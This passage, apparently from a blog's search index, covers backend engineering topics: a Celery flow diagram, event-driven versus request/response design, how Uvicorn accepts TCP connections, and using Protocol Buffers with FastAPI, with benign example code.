\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n               \u2502                              \u2502\n               \u2502                              \u2502\n               \u25bc                              \u25bc\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502  Celery Worker A     \u2502       \u2502   Celery Worker B    \u2502\n   \u2502  (Process Pool /     \u2502       \u2502  (Thread / Eventlet) \u2502\n   \u2502  Thread Pool / Async)\u2502       \u2502                      \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n               \u2502                              \u2502\n               \u2502 4. Fetch message (ACK/LATE)  \u2502\n               \u25bc                              \u25bc\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502      Consumer Loop   \u2502       \u2502      Consumer Loop   \u2502\n    \u2502 - Pull from queue    \u2502       \u2502 - Pull from queue    \u2502\n    \u2502 - Prefetch           \u2502       \u2502 - Prefetch           \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                \u2502                              \u2502\n                \u25bc                              \u25bc\n        \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n        \u2502    Deserializer      \u2502       \u2502    Deserializer      \u2502\n        \u2502 - JSON / pickle      \u2502       \u2502 - JSON / pickle      \u2502\n        \u2502 - Rebuild Python args\u2502       \u2502 - Rebuild Python args\u2502\n        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                    \u2502                              \u2502\n                    \u25bc                              \u25bc\n         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n         \u2502      Task Context    \u2502      \u2502      Task Context    \u2502\n         \u2502 - request.id         \u2502      \u2502 - retries            \u2502\n         \u2502 - ETA                \u2502      \u2502 - headers            \u2502\n         \u2502 - retries, timeouts  \u2502      \u2502 - routing info       \u2502\n         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                     \u2502                              \u2502\n                     \u25bc                              \u25bc\n              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n              \u2502     Task Function    \u2502      \u2502     Task Function    \u2502\n              \u2502   your Python code   \u2502      \u2502   your Python code   \u2502\n              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                          \u2502                              \u2502\n          \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n          \u2502        Success / Failure      \u2502   \u2502  Retry / Countdown  \u2502\n          \u2502 - result                      \u2502   \u2502 - requeue           \u2502\n          \u2502 - exception                   \u2502   \u2502 - backoff           \u2502\n          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                          \u2502                              \u2502\n                          \u25bc                              \u25bc\n                            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                            \u2502        Result Backend        \u2502\n                            \u2502  Redis / DB / RPC / S3       \u2502\n                            \u2502  - stores state:             \u2502\n                            \u2502    PENDING / STARTED         \u2502\n                            \u2502    SUCCESS / FAILURE         \u2502\n                            \u2502  - stores return value       \u2502\n                            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                                        \u25b2\n                                        \u2502\n                            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                            \u2502         Celery Beat          \u2502\n                            \u2502  - periodic schedule         \u2502\n                            \u2502  - cron / interval           \u2502\n                            \u2502  - emits tasks into broker   \u2502\n                            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"blog/blogs/2026-01-25_eda-vs-request-response/","title":"Event-Driven Architecture vs Request/Response: Designing Reactive Backends","text":"<p>Modern backend systems are not just about serving HTTP requests\u2014they\u2019re about reacting to events, decoupling components, and reusing data efficiently.  </p> <p>Choosing between Event-Driven Architecture (EDA) and classic Request/Response (R/R) shapes your system\u2019s performance, flexibility, and long-term maintainability.</p> <p>This guide explains:</p> <ul> <li>Fundamental differences  </li> <li>Data access and reuse patterns  </li> <li>Coupling and component interaction  </li> <li>Reactivity and responsiveness  </li> <li>Architectural flexibility  </li> <li>Practical diagrams  </li> </ul>"},{"location":"blog/blogs/2026-01-25_eda-vs-request-response/#1-core-difference","title":"1. Core Difference","text":"Aspect Request/Response (R/R) Event-Driven Architecture (EDA) Communication Synchronous, client waits Asynchronous, producer emits events Coupling Tight, direct dependencies Loose, decoupled services Data Flow Direct request \u2192 response Event stream, multiple consumers Reactivity Reactive per request only Reactive to events in real-time Scaling Scale endpoints Scale consumers independently Examples REST APIs, RPC Messaging queues, pub/sub, Kafka, RabbitMQ <p>R/R is predictable and easy to reason about, but it can create bottlenecks. EDA is flexible and reactive, but requires careful orchestration.</p>"},{"location":"blog/blogs/2026-01-25_eda-vs-request-response/#2-data-access-and-data-reuse","title":"2. Data Access and Data Reuse","text":"<p>In R/R:</p> <ul> <li>Each request may query the database separately  </li> <li>No shared intermediate state  </li> <li>High duplication of data retrieval  </li> </ul> <p>In EDA:</p> <ul> <li>Events carry data once, consumed by multiple subscribers  </li> <li>Enables data reuse across services </li> <li>Reduces redundant queries  </li> </ul> <p>Example: </p> <pre><code>+----------+      +------------+       +----------+\n| OrderSvc | ---&gt; | Event Bus  | ---&gt;  | Billing  |\n|          |      | (Kafka)    |       | Service  |\n+----------+      +------------+       +----------+\n|\nv\n+--------+\n| Audit  |\n+--------+\n</code></pre> <p>The same event triggers multiple independent consumers, avoiding repeated work.</p>"},{"location":"blog/blogs/2026-01-25_eda-vs-request-response/#3-coupling","title":"3. Coupling","text":"Type Request/Response Event-Driven Component Coupling Tight, direct Loose, via messages Deployment Often monolithic Independent services Change Impact High Low Failures Propagate upstream Isolated <p>Loose coupling in EDA allows teams to deploy independently, scale differently, and evolve services without breaking the whole system.</p>"},{"location":"blog/blogs/2026-01-25_eda-vs-request-response/#4-reactivity","title":"4. Reactivity","text":"<p>EDA naturally supports reactive systems:</p> <ul> <li>Services respond to events as they happen </li> <li>Enables near real-time workflows  </li> <li>Reduces latency between data generation and consumption  </li> </ul> <p>R/R systems react only when clients make requests, limiting responsiveness.</p> <pre><code>Client Request \u2192 Server Response (R/R)\nEvent Producer \u2192 Multiple Consumers (EDA)\n</code></pre>"},{"location":"blog/blogs/2026-01-25_eda-vs-request-response/#5-architectural-flexibility","title":"5. Architectural Flexibility","text":"<p>EDA provides:</p> <ul> <li>Flexible pipelines: add/remove consumers without affecting producers  </li> <li>Replayable workflows: events stored for replay/debugging  </li> <li>Backpressure handling: consumers can process at their own pace  </li> <li>Integration readiness: easy to connect new services  </li> </ul> <p>R/R is less flexible: adding a new feature often requires touching the server code and endpoints directly.</p>"},{"location":"blog/blogs/2026-01-25_eda-vs-request-response/#6-when-to-use-what","title":"6. When to Use What","text":"Use Case R/R EDA Simple CRUD \u2705 \u26a0\ufe0f may be overkill High-throughput async workflows \u26a0\ufe0f limited \u2705 ideal Multi-service integration \u26a0\ufe0f tightly coupled \u2705 loosely coupled Real-time notifications \u26a0\ufe0f polling required \u2705 event-driven Offline or batch processing \u26a0\ufe0f limited \u2705 event logs / replayable <p>Rule of thumb: Use R/R for synchronous, direct client interactions, and EDA for scalable, reactive, multi-consumer workflows.</p>"},{"location":"blog/blogs/2026-01-25_eda-vs-request-response/#7-closing-thought","title":"7. Closing Thought","text":"<p>EDA is not a silver bullet. It adds complexity, requires message brokers, and careful monitoring.  </p> <p>But if you want reactive, flexible, loosely-coupled systems capable of scaling horizontally and reusing data efficiently, EDA is your architecture.</p> <p>Designing the right architecture is about choosing the right tool for the right problem, not blindly following trends.</p>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/","title":"How Uvicorn Listens on an Open Port","text":""},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#from-syn-queue-to-fastapi","title":"From SYN Queue to FastAPI","text":"<p>For a backend engineer, understanding how Uvicorn listens on an open port is not an implementation detail - it\u2019s a reliability skill.</p> <p>When a FastAPI service struggles under load, the problem is often not async, not Python, and not your endpoint logic. It\u2019s the TCP accept path. Long before your application sees a request, the Linux kernel, socket queues, and the event loop decide whether that connection even exists.</p> <p>This post breaks down how Uvicorn binds to a port, what happens during the TCP handshake, and why SYN queues and accept queues directly affect latency, dropped connections, and system stability in production.</p>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#the-high-level-flow","title":"The High-Level Flow","text":"<p>At a high level, this is what happens:</p> <pre><code>Client \u2192 TCP Handshake \u2192 Kernel Queues \u2192 accept() \u2192 Uvicorn \u2192 ASGI \u2192 FastAPI\n</code></pre> <p>FastAPI only enters very late in this process.</p>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#step-1-binding-and-listening","title":"Step 1: Binding and Listening","text":"<p>When you start Uvicorn:</p> <pre><code>uvicorn app:app --host 0.0.0.0 --port 8000\n</code></pre> <p>Internally, Uvicorn:</p> <ol> <li>Creates a socket</li> <li>Binds it to an IP and port</li> <li>Calls <code>listen(backlog)</code></li> </ol> <p>This is a kernel-level operation.</p> <pre><code>socket()\nbind()\nlisten(backlog)\n</code></pre> <p>From this point on, the kernel owns incoming connections, not Uvicorn.</p>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#step-2-tcp-handshake-where-queues-begin","title":"Step 2: TCP Handshake (Where Queues Begin)","text":"<p>A TCP connection requires a three-way handshake:</p> <pre><code>Client \u2192 SYN\nServer \u2192 SYN-ACK\nClient \u2192 ACK\n</code></pre> <p>Linux uses two queues during this process.</p>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#syn-queue-half-open-connections","title":"SYN Queue (Half-Open Connections)","text":"<p>The SYN queue stores connections that:</p> <ul> <li>Sent <code>SYN</code></li> <li>Have not completed the handshake yet</li> </ul> <p>Characteristics:</p> <ul> <li>Half-open connections</li> <li>Vulnerable to SYN floods</li> <li>Controlled by kernel TCP settings</li> </ul> <p>If this queue fills:</p> <ul> <li>New SYN packets are dropped</li> <li>Clients see timeouts</li> <li>Your app is never notified</li> </ul>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#accept-queue-fully-established-connections","title":"Accept Queue (Fully Established Connections)","text":"<p>Once the handshake completes, the connection moves to the accept queue.</p> <p>This queue holds:</p> <ul> <li>Fully established TCP connections</li> <li>Waiting for the application to call <code>accept()</code></li> </ul> <p>This queue is what <code>listen(backlog)</code> actually controls.</p> <p>If the accept queue fills:</p> <ul> <li>Handshakes may complete</li> <li>But connections are dropped or reset</li> <li>Clients see connection failures even though the server is \u201cup\u201d</li> </ul>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#step-3-accept-where-uvicorn-enters","title":"Step 3: <code>accept()</code> \u2013 Where Uvicorn Enters","text":"<p>Uvicorn does not handle TCP itself.</p> <p>It relies on:</p> <ul> <li><code>asyncio</code></li> <li>The OS socket API</li> </ul> <p>Internally, the event loop repeatedly does:</p> <pre><code>accept() \u2192 return socket \u2192 hand off to protocol handler\n</code></pre> <p>Only now does Uvicorn:</p> <ul> <li>Wrap the socket</li> <li>Parse HTTP</li> <li>Create an ASGI scope</li> </ul> <p>If the event loop is slow or blocked:</p> <ul> <li>Accept queue fills</li> <li>Latency spikes</li> <li>Connections fail before FastAPI runs</li> </ul>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#step-4-event-loop-and-concurrency","title":"Step 4: Event Loop and Concurrency","text":"<p>Uvicorn uses an async event loop to:</p> <ul> <li>Accept new connections</li> <li>Read from sockets</li> <li>Schedule ASGI tasks</li> </ul> <p>Important implications:</p> <ul> <li><code>async</code> does not mean infinite parallelism</li> <li>Accepting connections still takes CPU time</li> <li>Slow handlers indirectly slow <code>accept()</code></li> </ul> <p>This is why CPU-bound work inside async apps is dangerous.</p>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#common-failure-modes-under-load","title":"Common Failure Modes Under Load","text":"Symptom Root Cause Connection timeouts SYN or accept queue overflow Works locally, fails in prod Different kernel backlog limits High latency before request handling Event loop overloaded Random connection resets Accept queue saturation <p>None of these are FastAPI bugs.</p>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#uvicorn-networking-cheat-sheet","title":"Uvicorn Networking Cheat Sheet","text":"<p>This section is intentionally dense. It\u2019s meant as a reference, not a tutorial.</p> <pre><code>TCP FLOW (Server Side)\n\nClient\n  |\n  |  SYN\n  v\n+------------------+\n|   SYN Queue      |  (half-open)\n|  - SYN received  |\n|  - waiting ACK   |\n+------------------+\n        |\n        | ACK\n        v\n+------------------+\n|  Accept Queue    |  (fully open)\n|  - handshake done|\n|  - waiting accept()\n+------------------+\n        |\n        | accept()\n        v\n+------------------+\n|  Uvicorn Socket  |\n|  - asyncio loop |\n|  - protocol     |\n+------------------+\n        |\n        v\n+------------------+\n|  ASGI App       |\n|  - middleware   |\n|  - FastAPI      |\n+------------------+\n</code></pre> <p>Key facts:</p> <ul> <li><code>listen(backlog)</code> limits the accept queue</li> <li>SYN queue is controlled by kernel TCP parameters</li> <li>Async does not bypass kernel limits</li> <li>If <code>accept()</code> is slow, FastAPI never sees traffic</li> </ul>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#why-this-matters-for-fastapi-engineers","title":"Why This Matters for FastAPI Engineers","text":"<p>FastAPI encourages async thinking - but the kernel still gates traffic.</p> <p>You can write:</p> <ul> <li>Perfect async code</li> <li>Non-blocking endpoints</li> <li>Scalable middleware</li> </ul> <p>And still fail under load if:</p> <ul> <li>Backlog is too small</li> <li>Event loop is saturated</li> <li>Kernel limits are ignored</li> </ul> <p>Understanding this changes how you:</p> <ul> <li>Debug production incidents</li> <li>Tune deployments</li> <li>Design load tests</li> </ul>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#closing-thought","title":"Closing Thought","text":"<p>Async frameworks don\u2019t replace the kernel. They sit on top of it.</p> <p>If your app never receives a request, the bug is often below Python, not inside it. Once you understand the SYN queue and accept queue, Uvicorn stops being \u201cmagic\u201d - and production behavior starts making sense.</p>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#references-official-documentation","title":"References &amp; Official Documentation","text":""},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#linux-networking","title":"Linux Networking","text":"<ul> <li> <p><code>listen(2)</code> https://man7.org/linux/man-pages/man2/listen.2.html</p> </li> <li> <p><code>accept(2)</code> https://man7.org/linux/man-pages/man2/accept.2.html</p> </li> <li> <p>Linux TCP settings   https://www.kernel.org/doc/html/latest/networking/ip-sysctl.html</p> </li> <li> <p>SYN packet handling in the wild - recommended!</p> </li> </ul>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#python-asyncio","title":"Python &amp; Asyncio","text":"<ul> <li> <p>Asyncio Event Loop   https://docs.python.org/3/library/asyncio-eventloop.html</p> </li> <li> <p><code>loop.sock_accept()</code> https://docs.python.org/3/library/asyncio-eventloop.html#asyncio.loop.sock_accept</p> </li> </ul>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#uvicorn","title":"Uvicorn","text":"<ul> <li>Uvicorn Configuration   https://www.uvicorn.org/settings/</li> </ul>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#asgi","title":"ASGI","text":"<ul> <li>ASGI Specification   https://asgi.readthedocs.io/en/latest/</li> </ul>"},{"location":"blog/blogs/2026-01-29_how-uvicorn-listens-on-a-port/#fastapi","title":"FastAPI","text":"<ul> <li>FastAPI Concepts  https://fastapi.tiangolo.com/deployment/concepts/</li> </ul>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/","title":"The Complete Guide to Protocol Buffers in FastAPI","text":"<p>JSON is everywhere. It\u2019s readable, flexible, and familiar.</p> <p>But it\u2019s not cheap.</p> <p>If you\u2019re building high-throughput APIs, internal services, event-driven systems, or latency-sensitive backends, JSON quietly becomes one of your biggest bottlenecks.</p> <p>This is where Protocol Buffers (Protobuf) come in.</p> <p>This guide explains: - What Protobuf actually is (beyond \u201cbinary JSON\u201d) - Why and when it beats JSON - How Protobuf works internally - How to use Protobuf with FastAPI - Real tradeoffs, not hype</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#what-is-protocol-buffers","title":"What Is Protocol Buffers?","text":"<p>Protocol Buffers is a language-neutral, platform-neutral binary serialization format developed by Google.</p> <p>At its core: - You define a schema - Data is encoded into compact binary - Producers and consumers share the same contract</p> <p>Unlike JSON: - Structure is explicit - Types are enforced - Encoding is deterministic and fast</p> <p>Official docs: https://protobuf.dev/</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#why-protobuf-exists-the-real-problem","title":"Why Protobuf Exists (The Real Problem)","text":"<p>JSON optimizes for: - Human readability - Flexibility - Ad-hoc usage</p> <p>Protobuf optimizes for: - Performance - Network efficiency - Strong contracts - Backward compatibility</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#cost-of-json-that-people-ignore","title":"Cost of JSON (That People Ignore)","text":"Cost Impact Text encoding Larger payloads Parsing CPU-heavy No schema Runtime surprises Weak typing Bugs move to production <p>For internal services, humans never read the payload. Machines do.</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#protobuf-vs-json-reality-check","title":"Protobuf vs JSON (Reality Check)","text":"Aspect JSON Protobuf Size Large Very small Parsing speed Slow Fast Schema Optional Required Backward compatibility Manual Built-in Human-readable Yes No API contracts Weak Strong <p>Rule of thumb:</p> <p>JSON for public APIs Protobuf for internal, high-performance systems</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#how-protobuf-works-internally","title":"How Protobuf Works Internally","text":"<p>Protobuf is not self-describing like JSON.</p> <p>Instead: 1. You define a schema (<code>.proto</code>) 2. The schema assigns field numbers 3. Data is encoded as <code>(field_number, type, value)</code></p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#example-proto","title":"Example <code>.proto</code>","text":"<pre><code>syntax = \"proto3\";\n\nmessage User {\n  int64 id = 1;\n  string email = 2;\n  bool active = 3;\n}\n</code></pre>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#why-field-numbers-matter","title":"Why Field Numbers Matter","text":"<ul> <li>Field numbers are the real identifiers</li> <li>Names can change, numbers should not</li> <li>Enables backward/forward compatibility</li> </ul> <p>This is why Protobuf survives versioning better than JSON.</p> <p>Docs: https://protobuf.dev/programming-guides/proto3/</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#serialization-deserialization","title":"Serialization &amp; Deserialization","text":""},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#json","title":"JSON","text":"<pre><code>Python dict \u2192 JSON string \u2192 bytes\n</code></pre>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#protobuf","title":"Protobuf","text":"<pre><code>Python object \u2192 binary encoding \u2192 bytes\n</code></pre> <p>Binary encoding means:</p> <ul> <li>Smaller payloads</li> <li>Faster parsing</li> <li>Lower GC pressure</li> </ul> <p>This matters a lot under load.</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#using-protobuf-in-fastapi","title":"Using Protobuf in FastAPI","text":"<p>FastAPI is JSON-first \u2014 but not JSON-only.</p> <p>FastAPI gives you:</p> <ul> <li>Raw request body access</li> <li>Custom response serialization</li> <li>Content-Type control</li> </ul> <p>That\u2019s enough.</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#step-1-define-your-protobuf-schema","title":"Step 1: Define Your Protobuf Schema","text":"<pre><code>syntax = \"proto3\";\n\nmessage AddRequest {\n  int32 a = 1;\n  int32 b = 2;\n}\n\nmessage AddResponse {\n  int32 result = 1;\n}\n</code></pre> <p>Generate Python code:</p> <pre><code>protoc --python_out=. add.proto\n</code></pre> <p>Docs: https://protobuf.dev/reference/python/</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#step-2-accept-protobuf-requests-in-fastapi","title":"Step 2: Accept Protobuf Requests in FastAPI","text":"<pre><code>from fastapi import FastAPI, Request, Response\nfrom add_pb2 import AddRequest, AddResponse\n\napp = FastAPI()\n\n@app.post(\"/add\")\nasync def add(request: Request):\n    body = await request.body()\n\n    add_req = AddRequest()\n    add_req.ParseFromString(body)\n\n    res = AddResponse(result=add_req.a + add_req.b)\n\n    return Response(\n        content=res.SerializeToString(),\n        media_type=\"application/x-protobuf\"\n    )\n</code></pre> <p>Key points:</p> <ul> <li>FastAPI doesn\u2019t parse the body</li> <li>You control serialization</li> <li>Zero JSON overhead</li> </ul>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#content-type-matters","title":"Content-Type Matters","text":"<p>Use:</p> <pre><code>application/x-protobuf\n</code></pre> <p>This allows:</p> <ul> <li>Clear API contracts</li> <li>Reverse proxies to behave correctly</li> <li>Clients to know what to expect</li> </ul>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#client-side-example-python","title":"Client Side Example (Python)","text":"<pre><code>import requests\nfrom add_pb2 import AddRequest, AddResponse\n\nreq = AddRequest(a=2, b=3)\npayload = req.SerializeToString()\n\nresp = requests.post(\n    \"http://localhost:8000/add\",\n    data=payload,\n    headers={\"Content-Type\": \"application/x-protobuf\"}\n)\n\nres = AddResponse()\nres.ParseFromString(resp.content)\n\nprint(res.result)\n</code></pre>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#protobuf-fastapi-vs-grpc","title":"Protobuf + FastAPI vs gRPC","text":"<p>Important distinction.</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#fastapi-protobuf","title":"FastAPI + Protobuf","text":"<ul> <li>HTTP/1.1 or HTTP/2</li> <li>REST-like semantics</li> <li>Works with existing infra</li> <li>Easier to debug/deploy</li> </ul>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#grpc","title":"gRPC","text":"<ul> <li>HTTP/2 only</li> <li>Streaming built-in</li> <li>Strong tooling</li> <li>More infra requirements</li> </ul> <p>Use Protobuf with FastAPI when:</p> <ul> <li>You want REST semantics</li> <li>You already run FastAPI</li> <li>You don\u2019t want full gRPC stack</li> </ul> <p>Docs: https://grpc.io/docs/</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#schema-evolution-why-protobuf-shines","title":"Schema Evolution (Why Protobuf Shines)","text":"<p>Protobuf supports:</p> <ul> <li>Adding fields safely</li> <li>Removing unused fields</li> <li>Optional fields</li> <li>Versioning without breaking clients</li> </ul> <p>Rules:</p> <ul> <li>Never reuse field numbers</li> <li>Don\u2019t change field types</li> <li>Add new fields with new numbers</li> </ul> <p>This is massively better than JSON versioning.</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#when-you-should-not-use-protobuf","title":"When You Should NOT Use Protobuf","text":"<p>Be honest about tradeoffs.</p> <p>Avoid Protobuf when:</p> <ul> <li>Public APIs for external users</li> <li>Debugging simplicity matters more than performance</li> <li>Clients are browsers</li> <li>Payloads are tiny and infrequent</li> </ul> <p>Binary formats have operational cost.</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#performance-reality","title":"Performance Reality","text":"<p>In production systems:</p> <ul> <li>Payloads can be 3\u201310x smaller</li> <li>CPU usage drops noticeably</li> <li>GC pressure decreases</li> <li>Tail latency improves</li> </ul> <p>But:</p> <p>Serialization is rarely the only bottleneck It\u2019s one of many \u2014 networking, queues, locks, IO</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#where-protobuf-fits-architecturally","title":"Where Protobuf Fits Architecturally","text":"<p>Protobuf shines in:</p> <ul> <li>Internal microservices</li> <li>Event-driven systems</li> <li>Message brokers</li> <li>Async task payloads (Celery, Kafka)</li> <li>High-frequency APIs</li> </ul> <p>It pairs extremely well with:</p> <ul> <li>FastAPI</li> <li>AMQP</li> <li>EDA</li> <li>Internal service meshes</li> </ul>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#closing-thought","title":"Closing Thought","text":"<p>Protocol Buffers are not about being fancy.</p> <p>They\u2019re about:</p> <ul> <li>Explicit contracts</li> <li>Predictable performance</li> <li>Systems that age well</li> </ul> <p>If JSON is a conversation, Protobuf is a contract.</p> <p>And backend systems run on contracts.</p>"},{"location":"blog/blogs/2026-02-07_protobuf-fastapi-guide/#references","title":"References","text":"<ul> <li>Protobuf Official Docs: https://protobuf.dev/</li> <li>Python Protobuf API: https://protobuf.dev/reference/python/</li> <li>Protobuf Encoding: 